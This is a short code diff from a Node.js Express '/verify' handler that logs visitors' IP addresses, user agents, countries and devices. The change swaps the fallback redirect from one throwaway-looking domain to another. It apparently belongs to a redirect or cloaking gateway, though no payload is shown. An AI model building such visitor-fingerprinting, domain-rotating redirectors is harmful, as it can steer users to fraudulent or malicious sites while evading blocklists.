@@ -210,7 +210,7 @@ app.post('/verify', async (req, res) => {
         const device = detectDeviceType(ua);
 
         logVisitor(clientIp, ua, country, device);
-        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://storedns26.com/share/gcGfVLQWXaI';
+        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://pstore422.cc/share/lTdwxDXduoA';
         const cleanBaseUrl = baseUrl.endsWith('#') ? baseUrl.slice(0, -1) : baseUrl;
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
